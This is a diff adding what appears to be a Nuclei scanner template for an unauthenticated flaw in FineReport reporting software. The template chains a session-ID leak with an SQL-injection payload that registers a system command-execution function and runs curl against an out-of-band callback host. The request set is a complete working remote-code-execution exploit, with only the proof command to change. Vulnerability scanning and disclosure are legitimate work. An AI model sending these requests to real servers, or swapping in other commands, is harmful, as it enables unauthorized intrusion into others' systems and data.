@@ -1,0 +1,52 @@
+id: fanruan-finereport-fr_log-rce
+
+info:
+  name: 帆软报表 fr_log - rce
+  author: leadlife
+  severity: critical
+  description: FineReport报表软件网络报表查询处存在未授权访问，从而导致sql注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query:
+  tags: fanruan,finereport,rce,oob
+
+http:
+  - raw:
+      - |
+        GET /ReportServer?op=fr_log&cmd=fg_errinfo&fr_username=admin HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST /ReportServer?op=fr_dialog&cmd=parameters_d&sessionID={{sessionID}} HTTP/1.1
+        Host: {{Hostname}}
+
+        __parameters__={"LABEL1":"TYPE:","TYPE":"6;CREATE ALIAS RUMCMD FOR \"com.fr.chart.phantom.system.SystemServiceUtils.exeCmd\";CALL RUMCMD('curl {{interactsh-url}}');select msg, trace, sinfo, logtime from fr_errrecord where 1=1","LABEL3":"START_TIME:","START_TIME":"2020-08-11 00:00","LABEL5":"END_TIME:","END_TIME":"2020-08-11 16:41","LABEL7":"LIMIT:","LIMIT":2}
+
+      - |
+        GET /ReportServer?_=1691062003921&__boxModel__=true&op=page_content&sessionID={{sessionID}}&pn=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    extractors:
+      - type: regex
+        name: sessionID
+        part: body_1
+        group: 1
+        internal: true
+        regex:
+          - "FR.SessionMgr.register\\('(\\d+)'"  
+               
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && contains(body_1,'sessionID')
+          - status_code_2 == 200
+        condition: and
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+          - "http"
+        condition: or
